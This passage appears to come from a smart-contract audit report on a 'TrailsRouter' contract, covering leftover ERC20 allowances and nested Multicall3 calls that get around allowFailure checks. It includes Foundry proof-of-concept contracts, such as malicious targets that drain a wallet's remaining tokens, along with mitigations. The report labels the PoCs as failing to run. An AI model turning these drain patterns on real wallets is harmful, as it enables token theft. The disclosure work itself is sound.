        // Same opHash as above; sentinel already set in prior test, but set again for clarity
        bytes32 opHash = keccak256("test-op");
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        vm.store(address(wallet), bytes32(slot), bytes32(TrailsSentinelLib.SUCCESS_VALUE));

        // Zero out wallet.slot0 to ensure _tstoreSupport is false => sload path is used
        vm.store(address(wallet), bytes32(uint256(0)), bytes32(0));

        // Should succeed, sweeping the wallet's entire token balance to this test contract
        wallet.delegatedValidate(address(router), opHash, address(token), address(this));

        assertEq(token.balanceOf(address(this)), 1 ether, "recipient should receive swept tokens");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet should be emptied");
    }
}


## Suggested Mitigation
Make _tstoreSupport collision-resistant and avoid runtime backend switching based on a plain slot under delegatecall:

- Namespaced flag: store the activation flag in a deterministic keccak-based slot to avoid clashing with host storage.
  Example:
  - bytes32 internal constant _TSTORE_FLAG_SLOT = keccak256("tstorish.support.flag.v1");
  - Read/write via assembly sload/sstore at that slot.
  This prevents accidental truthiness from the host’s slot 0.

- Prefer immutable backend choice per chain: If TSTORE is unsupported at deployment, permanently bind _getTstorish/_setTstorish/_clearTstorish to sload/sstore variants and do not enable switching at runtime based on a mutable flag. Publish a separate build where TSTORE is natively used for chains that support it.

- Defensive read: In validateOpHashAndSweep, when using a fallback getter, wrap the _getTstorish read in a try/catch (or assembly check) and on failure or unexpected zero where sstore is known to be used, fall back to a direct sload(successSlot). This prevents a full DoS if a misconfigured flag ever triggers the tload path.

- If retaining runtime activation (__activateTstore), write/read the flag only from the namespaced slot, and document that activation must be done in the host context (under delegatecall or via a dedicated helper) so both writer and reader agree on the backend.





 **Derived From** : After any successful injectSweepAndCall or injectAndCall call with token != address(0), the caller (wallet in delegatecall context or TrailsRouter in direct context) should not leave non-zero ERC20 allowance to target that can be used outside the scope of this call; formally, for such calls we would like IERC20(token).allowance(address(this), target) == 0 immediately after completion.

## [M-7]. injectAndCall/injectSweepAndCall leave unrestricted ERC20 allowances, enabling future unauthorized drains of user wallets

### Finding Severity Justification: ERC20 approvals granted during injectAndCall/injectSweepAndCall are not revoked, leaving residual allowance from the user’s Sequence wallet (delegatecall context) to an arbitrary target. A malicious or later-compromised target (including an EOA target) can subsequently pull remaining tokens up to the leftover allowance without further user consent. Impact is direct asset loss, but requires external conditions (malicious/compromised target or misuse in route construction), so Medium per rubric.
## Derived From Pattern/Invariant
After any successful injectSweepAndCall or injectAndCall call with token != address(0), the caller (wallet in delegatecall context or TrailsRouter in direct context) should not leave non-zero ERC20 allowance to target that can be used outside the scope of this call; formally, for such calls we would like IERC20(token).allowance(address(this), target) == 0 immediately after completion.

## Exploit Type
AccessControl

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Exploitation hinges on route selection/off-chain integration choosing a malicious or later-compromised target, which may be outside the protocol’s immediate control and could be considered integrator risk in some models. Nevertheless, the unrevoked-approval behavior is clearly present and has a plausible abuse path.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`injectAndCall` and `injectSweepAndCall` both delegate to `_injectAndExecuteCall` for ERC20 flows. In that function, the router sets an allowance for the full `callerBalance` but never revokes it after the target call finishes:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        // ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

In delegatecall context through a Sequence wallet, `_getSelfBalance(token)` in `_injectAndCallDelegated` reads the **wallet’s token balance**. `_injectAndExecuteCall` then executes:

- `SafeERC20.forceApprove(erc20, target, callerBalance)` **from the wallet** to `target`, for the entire token balance.
- Calls `target.call(callData)`, where `target` may spend some subset `s ≤ callerBalance` via `transferFrom(wallet, ...)`.

After the call returns successfully:
- The remaining allowance is `allowance(wallet, target) = callerBalance - s` (or `callerBalance` if `target` chooses not to spend anything).
- This leftover allowance persists indefinitely, and the router never resets it to zero.

This violates the stated invariant of intent-scoped authorization: a single intent (and user signature) is supposed to grant authority **only for the operations in that specific call**. Instead, the integration leaves a reusable approval that lets `target` pull more tokens later without any further user consent.

A malicious or compromised `target` contract (or one that later gets upgraded) can subsequently call `transferFrom(wallet, attacker, remainingAllowance)` in a separate transaction issued by the attacker, draining the wallet’s tokens based solely on the leftover allowance. This can also capture tokens the wallet acquires in the future (up to the allowance value).

The same pattern applies in the direct `injectSweepAndCall` ERC20 branch: tokens are moved into the router, approved to `target`, and any leftovers remain approved for later arbitrary use by `target`.


## Impact
After a seemingly successful intent execution, a malicious or later-compromised target contract retains a non-zero allowance from the user’s wallet and can, in future transactions, unilaterally drain the remaining tokens (and potentially any newly acquired tokens up to the allowance), without any additional user signature or intent. This breaks the protocol’s intent-scoped authorization guarantee and can lead to complete theft of the wallet’s balance for the approved token.

## Command to Run Test


## Proof of Concept
This PoC simulates a Sequence wallet delegating to `TrailsRouter.injectAndCall` via `delegatecall` using a simple `MockWallet`. The router sets an allowance from the wallet to a malicious target, which spends only a portion of the tokens in the first call. The leftover allowance is then exploited in a later transaction to drain the remaining tokens without a new user signature.

1. Deploy `TrailsRouter`, `TestToken2`, `MaliciousTarget2`, and `MockWallet2`.
2. Mint 1,000 tokens to `MockWallet2`.
3. User calls `MockWallet2.execInjectAndCall(...)`, which delegatecalls into `router.injectAndCall`:
   - `_getSelfBalance(token)` sees the wallet’s full balance `B = 1000`.
   - `_injectAndExecuteCall` calls `SafeERC20.forceApprove(token, target, B)` from the wallet.
   - It then calls `MaliciousTarget2.spendSome(token, wallet, s)` which transfers only `s = 100` tokens out of the wallet.
4. After this intent, the wallet still holds `B − s = 900` tokens and the allowance `allowance(wallet, target) = 900`.
5. Later, the attacker calls `MaliciousTarget2.drainRemaining(token, wallet, attacker)` directly. This uses the leftover allowance to `transferFrom(wallet, attacker, 900)`, draining the rest of the wallet with no new user approval.


## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken2 is ERC20 {
    constructor() ERC20("TestToken2", "TT2") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousTarget2 {
    // Spend only a portion of the approved balance during the intent
    function spendSome(address token, address from, uint256 amount) external {
        IERC20(token).transferFrom(from, address(this), amount);
    }

    // Later, drain all remaining tokens using the leftover allowance
    function drainRemaining(address token, address from, address to) external {
        uint256 bal = IERC20(token).balanceOf(from);
        IERC20(token).transferFrom(from, to, bal);
    }
}

// Simulate a Sequence wallet that delegates into TrailsRouter
contract MockWallet2 {
    address public router;

    constructor(address _router) {
        router = _router;
    }

    function execInjectAndCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) external {
        (bool ok,) = router.delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.injectAndCall.selector,
                token,
                target,
                callData,
                amountOffset,
                placeholder
            )
        );
        require(ok, "delegatecall failed");
    }
}

contract InjectAndCallAllowanceTest is Test {
    TrailsRouter router;
    TestToken2 token;
    MaliciousTarget2 target;
    MockWallet2 wallet;

    address user = address(0xBEEF);
    address attacker = address(0xCAFE);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken2();
        target = new MaliciousTarget2();
        wallet = new MockWallet2(address(router));

        // Give the wallet an initial balance of tokens
        token.mint(address(wallet), 1_000 ether);
    }

    function test_LeftoverAllowanceAllowsFutureDrain() public {
        uint256 B = token.balanceOf(address(wallet));
        uint256 s = 100 ether;
        assertEq(B, 1_000 ether);

        // Prepare calldata for the malicious target's partial-spend function
        bytes memory callData = abi.encodeWithSelector(
            MaliciousTarget2.spendSome.selector,
            address(token),
            address(wallet),
            s
        );

        // User triggers the intent via the wallet, which delegatecalls into TrailsRouter.injectAndCall
        vm.prank(user);
        wallet.execInjectAndCall(
            address(token),
            address(target),
            callData,
            0,
            bytes32(0)
        );

        // Only s tokens were spent in this call
        assertEq(token.balanceOf(address(target)), s);
        assertEq(token.balanceOf(address(wallet)), B - s);

        // But a large allowance remains from the wallet to the malicious target
        uint256 remainingAllowance = token.allowance(address(wallet), address(target));
        assertEq(remainingAllowance, B - s, "leftover allowance should equal remaining balance");

        // Later, attacker drains the rest without any new user signature
        vm.prank(attacker);
        target.drainRemaining(address(token), address(wallet), attacker);

        assertEq(token.balanceOf(attacker), B - s, "attacker drained remaining tokens");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet is drained");
        assertEq(token.allowance(address(wallet), address(target)), 0, "allowance consumed");
    }
}


## Suggested Mitigation
Ensure that any allowance granted by `_injectAndExecuteCall` is **fully revoked** after the target call completes.

A straightforward fix for the ERC20 branch:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        // Always revoke allowance after the call, even if it reverted (the whole tx will revert anyway)
        SafeERC20.forceApprove(erc20, target, 0);

        if (!success) revert TargetCallFailed(result);
    }
}
```

This ensures that, after any successful `injectAndCall`/`injectSweepAndCall` for ERC20 tokens, `allowance(caller, target) == 0` and no future unauthorized spends are possible. For particularly sensitive integrations, you may additionally want to bound `callerBalance` to the exact amount needed for this call rather than the full wallet balance.


## [H-8]. Balance injection leaves leftover ERC20 allowance to target, enabling post-intent token theft

### Finding Severity Justification: Leftover ERC20 allowance from the user’s Sequence wallet (delegatecall context) to an arbitrary target persists after injectAndCall/injectSweepAndCall. A malicious or compromised target can later transferFrom the wallet without any new user authorization, enabling direct theft of remaining tokens up to the approved amount (typically the wallet’s full token balance at call time). This is a clear, realistic asset-loss scenario.
## Derived From Pattern/Invariant
After any successful injectSweepAndCall or injectAndCall call with token != address(0), the caller (wallet in delegatecall context or TrailsRouter in direct context) should not leave non-zero ERC20 allowance to target that can be used outside the scope of this call; formally, for such calls we would like IERC20(token).allowance(address(this), target) == 0 immediately after completion.

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The invariant requires that after `injectSweepAndCall` or `injectAndCall` completes for an ERC20, there should be no remaining allowance for the `target` so that authorization is scoped strictly to the single call.

However, `_injectAndExecuteCall` leaves any unused allowance in place:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(...);
        if (!success) revert TargetCallFailed(result);
    }
}
```

There is no reset of `allowance(owner, target)` after the call. In delegatecall context (Sequence wallet), `address(this)` is the wallet contract, so `forceApprove` sets an allowance from the wallet to the arbitrary `target` for `callerBalance`, which is the wallet's **entire balance** of the token at call time:

```solidity
uint256 callerBalance = _getSelfBalance(token); // wallet's full token balance
SafeERC20.forceApprove(erc20, target, callerBalance);
```

If `target` spends only a small portion `s` of this allowance during the injected call, the remaining `callerBalance - s` allowance persists indefinitely. Later, the attacker (who controls `target`) can invoke any function on `target` that calls `token.transferFrom(wallet, attacker, remaining)` and drain the remaining tokens. This second theft transaction does **not** go through TrailsRouter, requires no additional user signature or intent, and is invisible to Trails’ EIP-712 authorization layer.

This directly violates the intent-scoped-authorization invariant: the user’s signature for a single intent authorizes the `target` to spend up to `callerBalance` **once**, but the implementation effectively gives a reusable approval that can be exploited in future arbitrary calls.

## Impact
A malicious target contract used in an injected call can intentionally spend only a small fraction of the approved balance during the authorized Trails execution, then later (in a completely unrelated transaction) use the leftover allowance to drain the remaining ERC20 balance from the Sequence wallet. This enables direct theft of the wallet's tokens without any new user approval or Trails intent, up to the full wallet balance at the time of the original call.

## Command to Run Test


## Proof of Concept
1. A Sequence wallet holds 1000 tokens `T`.
2. The Trails intent encodes a delegated call to `injectAndCall(T, target, ...)` where `target` is attacker-controlled.
3. In delegatecall context, `injectAndCall` computes `callerBalance = 1000` and `_injectAndExecuteCall` does `forceApprove(T, target, 1000)` from the wallet.
4. `target`'s function spends only 100 tokens during this call, leaving an allowance of 900 from the wallet to `target`.
5. At any later time, the attacker calls `target.drain()` which calls `T.transferFrom(wallet, attacker, 900)`. This succeeds because the allowance remains and no Trails logic is involved.
6. The attacker steals the remaining 900 tokens without any further signature from the user.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "M") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousTarget {
    IERC20 public immutable token;
    address public victimWallet;

    constructor(address token_) {
        token = IERC20(token_);
    }

    // Called once via TrailsRouter.injectAndCall (delegatecall context)
    function takeSmallAmount(uint256 amountToSpend) external {
        // msg.sender is the wallet when called through the router (delegatecall)
        if (victimWallet == address(0)) {
            victimWallet = msg.sender;
        }
        // Spend only a small part of the approved amount
        token.transferFrom(victimWallet, address(this), amountToSpend);
    }

    // Called later by attacker to drain leftover allowance
    function drainRemaining(address to) external {
        uint256 remaining = token.allowance(victimWallet, address(this));
        token.transferFrom(victimWallet, to, remaining);
    }
}

contract Wallet {
    address public router;

    constructor(address _router) {
        router = _router;
    }

    // Simulate Sequence wallet delegating into TrailsRouter.injectAndCall
    function useInjectAndCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) external {
        (bool ok,) = router.delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.injectAndCall.selector,
                token,
                target,
                callData,
                amountOffset,
                placeholder
            )
        );
        require(ok, "delegatecall failed");
    }
}

contract BalanceInjectionApprovalLeakTest is Test {
    TrailsRouter router;
    MockToken token;
    MaliciousTarget target;
    Wallet wallet;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        target = new MaliciousTarget(address(token));
        wallet = new Wallet(address(router));

        // Fund the wallet with tokens
        token.mint(address(wallet), 1000 ether);
    }

    function test_maliciousTargetCanDrainLeftoverApproval() public {
        // First call: user executes intent that spends only 100 of 1000 tokens
        bytes memory cd = abi.encodeWithSelector(MaliciousTarget.takeSmallAmount.selector, 100 ether);

        wallet.useInjectAndCall(
            address(token),
            address(target),
            cd,
            0,
            bytes32(0)
        );

        // Target has received 100 tokens during the authorized call
        assertEq(token.balanceOf(address(target)), 100 ether, "target should hold 100 tokens");

        // But allowance from wallet to target is still 900 tokens
        uint256 remaining = token.allowance(address(wallet), address(target));
        assertEq(remaining, 900 ether, "900 tokens of allowance remain");

        // Later, attacker drains the remaining allowance without new user approval
        vm.prank(attacker);
        target.drainRemaining(attacker);

        assertEq(token.balanceOf(attacker), 900 ether, "attacker stole remaining 900 tokens");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet lost all tokens");
    }
}


## Suggested Mitigation
After the injected call returns in the ERC20 branch, explicitly clear the allowance granted to `target` so that authorization is strictly scoped to the single call.

For example, in `_injectAndExecuteCall`:

```solidity
if (token != address(0)) {
    IERC20 erc20 = IERC20(token);
    SafeERC20.forceApprove(erc20, target, callerBalance);

    (bool success, bytes memory result) = target.call(callData);
    emit BalanceInjectorCall(...);

    // Always revoke the allowance, regardless of success
    SafeERC20.forceApprove(erc20, target, 0);

    if (!success) revert TargetCallFailed(result);
}
```

This ensures that even if the target spends only part of the approved amount or none at all, no leftover allowance remains for future, unauthorized transfers.





 **Derived From** : Whenever TrailsRouter.execute / pullAndExecute / pullAmountAndExecute succeed (do not revert), all Multicall3.aggregate3Value invocations reachable from that call must themselves enforce allowFailure == false for every Call3Value entry, including any nested aggregate3Value calls; i.e., there must be no inner Multicall3 aggregate configured with allowFailure == true that can swallow a reverting subcall while the outer router call still succeeds.

## [M-9]. Nested Multicall3.aggregate3Value calls bypass allowFailure enforcement, letting partial failures be reported as full success

### Finding Severity Justification: The router’s _validateRouterCall only enforces allowFailure == false on the top-level aggregate3Value calls and does not inspect nested aggregate3Value payloads. This allows a route to include a nested Multicall3 with inner allowFailure == true, swallowing failures while the outer call returns success. While this does not directly steal assets, it breaks the expected atomicity of the bundle and can cause protocol-level misaccounting and incorrect success signaling (e.g., success sentinel set), potentially leading to improper fee sweeps or inconsistent flow progression. Impact is on protocol correctness rather than guaranteed asset theft, fitting Medium severity.
## Derived From Pattern/Invariant
Whenever TrailsRouter.execute / pullAndExecute / pullAmountAndExecute succeed (do not revert), all Multicall3.aggregate3Value invocations reachable from that call must themselves enforce allowFailure == false for every Call3Value entry, including any nested aggregate3Value calls; i.e., there must be no inner Multicall3 aggregate configured with allowFailure == true that can swallow a reverting subcall while the outer router call still succeeds.

## Exploit Type
AccountingInvariantViolation

## Location
TrailsRouter.execute

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The risk pathway to incorrect fee sweeping depends on the Shim’s sentinel-setting logic, which is not shown here. However, the core router validation weakness and the ability to mask inner failures via nesting are clear from the provided code. Given that the full downstream impact relies on external components’ handling of results, confidence is somewhat limited.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`TrailsRouter._validateRouterCall` is supposed to enforce that all Multicall3 calls used via `execute`, `pullAndExecute`, or `pullAmountAndExecute` set `allowFailure == false`, so that any failing inner call causes the whole bundle to revert.

The implementation, however, only validates the **top-level** `Call3Value[]` array decoded from the directly passed `data`:

```solidity
function _validateRouterCall(bytes memory callData) internal pure {
    // Extract function selector
    if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0));

    bytes4 selector;
    assembly {
        selector := mload(add(callData, 32))
    }

    // Only allow `aggregate3Value` calls (0x174dea71)
    if (selector != 0x174dea71) {
        revert InvalidFunctionSelector(selector);
    }

    // Decode and validate the Call3Value[] array to ensure allowFailure=false for all calls
    IMulticall3.Call3Value[] memory calls = abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]));

    for (uint256 i = 0; i < calls.length; i++) {
        if (calls[i].allowFailure) {
            revert AllowFailureMustBeFalse(i);
        }
    }
}
```

Nothing prevents a top-level call from targeting `MULTICALL3` again, with `callData` encoding a **nested** `aggregate3Value` that itself contains `Call3Value` entries with `allowFailure == true`. For example:

- Top-level `aggregate3Value` (passed to `TrailsRouter.execute`) has one `Call3Value`:
  - `target = MULTICALL3`, `allowFailure = false`, `callData = abi.encodeWithSelector(aggregate3Value(selector), innerCalls)`
- The `innerCalls` array includes an entry with `allowFailure = true` to a deliberately reverting target.

`_validateRouterCall` only inspects the top-level `calls` array, sees `allowFailure == false` for the sole entry, and passes. At runtime:

1. The router delegatecalls into `MULTICALL3.aggregate3Value` with the outer calls.
2. The outer aggregate invokes the nested `aggregate3Value` on `MULTICALL3` itself.
3. Inside the nested aggregate, one inner call reverts, but because its `allowFailure == true`, the nested aggregate records `success = false` for that inner call and **does not revert**.
4. The nested aggregate returns `success = true` to the outer aggregate, which then records the outer call as successful.
5. `TrailsRouter.execute` then returns with `success == true` for all top-level entries and no revert.

This means TrailsRouter (and the shim’s sentinel logic built around it) can report an operation as fully successful while some of the intended inner actions have silently failed. Any state changes from earlier nested calls are kept, leading to partial execution of what was expected to be an atomic bundle.

In cross-chain contexts where sentinels are used to gate fee sweeps or subsequent legs based on `execute` succeeding, this discrepancy can cause:
- Sentinel being set for an `opHash` even though some internal steps failed.
- Subsequent `validateOpHashAndSweep` calls to treat a partially executed origin leg as successful, potentially sweeping funds or continuing a saga that should have been aborted.

While the immediate on-chain manifestation is a state-machine / accounting invariant violation rather than a direct theft, it can lead to mispriced or inconsistent flows and complicate reasoning about correctness of complex intent bundles.


## Impact
Attackers or misconfigured routes can construct multicall payloads where some inner operations revert under allowFailure=true, yet the router returns overall success and the shim may set the success sentinel. This breaks the invariant that a successful router call implies all sub-operations succeeded, enabling partially applied bundles, inconsistent state, and incorrect downstream fee or sweep logic. In complex cross-chain flows this can lead to subtle fund misrouting or stuck positions.

## Command to Run Test


## Proof of Concept
The following PoC:
1. Deploys `TrailsRouter` and a `MockMulticall3` that implements `aggregate3Value` with standard allowFailure semantics.
2. Uses `vm.etch` to install `MockMulticall3`’s code at `router.MULTICALL3()` so that `TrailsRouter.execute` delegatecalls into our mock.
3. Constructs a **nested** `aggregate3Value` call where:
   - Inner aggregate has two calls: one increments a `Counter3`, the second is a reverting call with `allowFailure = true`.
   - Outer aggregate has a single call to `MULTICALL3.aggregate3Value(innerCalls)` with `allowFailure = false`.
4. Calls `router.execute` with the outer aggregate calldata.
5. Observes that:
   - `router.execute` does not revert.
   - The returned top-level `Result[0].success` is `true`.
   - The `Counter3` state has been incremented.
   - Decoding the nested results reveals that the second inner call has `success == false`, meaning a failure occurred but was swallowed by the inner allowFailure.

This demonstrates that `_validateRouterCall` fails to enforce the no-allowFailure invariant on nested Multicall3 calls.


## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";

contract MockMulticall3 is IMulticall3 {
    function aggregate3(Call3[] calldata) external payable returns (Result[] memory) {
        revert("not used");
    }

    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory results) {
        results = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
            if (!success && !calls[i].allowFailure) {
                assembly {
                    revert(add(ret, 0x20), mload(ret))
                }
            }
            results[i] = Result({success: success, returnData: ret});
        }
    }
}

contract Counter3 {
    uint256 public count;
    function increment() external payable { count++; }
}

contract Reverter3 {
    function boom() external payable {
        revert("boom");
    }
}

contract NestedMulticallAllowFailureTest is Test {
    TrailsRouter router;
    MockMulticall3 mock;
    Counter3 counter;
    Reverter3 reverter;

    function setUp() public {
        router = new TrailsRouter();
        mock = new MockMulticall3();
        counter = new Counter3();
        reverter = new Reverter3();

        // Install mock code at the canonical MULTICALL3 address used by the router
        vm.etch(router.MULTICALL3(), address(mock).code);
    }

    function test_NestedAllowFailurePassesValidation() public {
        // Inner aggregate3Value: first increments counter, second reverts with allowFailure = true
        IMulticall3.Call3Value[] memory innerCalls = new IMulticall3.Call3Value[](2);
        innerCalls[0] = IMulticall3.Call3Value({
            target: address(counter),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(Counter3.increment.selector)
        });
        innerCalls[1] = IMulticall3.Call3Value({
            target: address(reverter),
            allowFailure: true,
            value: 0,
            callData: abi.encodeWithSelector(Reverter3.boom.selector)
        });

        bytes memory innerData = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, innerCalls);

        // Outer aggregate3Value: single call to MULTICALL3 with allowFailure = false
        IMulticall3.Call3Value[] memory outerCalls = new IMulticall3.Call3Value[](1);
        outerCalls[0] = IMulticall3.Call3Value({
            target: router.MULTICALL3(),
            allowFailure: false,
            value: 0,
            callData: innerData
        });

        bytes memory topLevelData = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, outerCalls);

        IMulticall3.Result[] memory topResults = router.execute(topLevelData);

        // Router considers the overall call successful
        assertEq(topResults.length, 1);
        assertTrue(topResults[0].success, "top-level call should be marked success");

        // Counter was incremented even though a nested call failed
        assertEq(counter.count(), 1, "counter should have been incremented");

        // Decode nested results and verify the second call failed silently
        IMulticall3.Result[] memory innerResults = abi.decode(topResults[0].returnData, (IMulticall3.Result[]));
        assertEq(innerResults.length, 2);
        assertTrue(innerResults[0].success, "first inner call succeeded");
        assertFalse(innerResults[1].success, "second inner call failed but was swallowed");
    }
}


## Suggested Mitigation
Strengthen _validateRouterCall to enforce allowFailure == false at any depth of Multicall3 aggregation. Two safe options:

1) Recursive validation (preferred):
- While iterating the top-level IMulticall3.Call3Value[] calls, if calls[i].target == MULTICALL3, parse calls[i].callData and ensure the selector is either aggregate3Value or aggregate3.
- For aggregate3Value (0x174dea71), decode IMulticall3.Call3Value[] and require all entries have allowFailure == false. For any entry with target == MULTICALL3, recursively validate its callData.
- For aggregate3 (selector for aggregate3(tuple(address,bool,bytes)[])), decode IMulticall3.Call3[] and similarly require all entries have allowFailure == false, and if any entry targets MULTICALL3, recursively validate its callData.
- Reject any MULTICALL3 calls using unknown selectors. Optionally enforce a reasonable maximum recursion depth to bound gas.

2) Simpler, stricter rule: Disallow nested MULTICALL3 entirely.
- In the top-level loop, after checking allowFailure == false, also revert if calls[i].target == MULTICALL3 and the embedded callData itself targets MULTICALL3 (i.e., any nesting). Alternatively, revert on any call whose target == MULTICALL3 unless it is the top-level call being executed by the router. This guarantees no inner aggregation can swallow failures.

Either approach restores the invariant that if TrailsRouter.execute / pullAndExecute / pullAmountAndExecute return successfully, then no sub-call at any depth was executed under allowFailure == true.



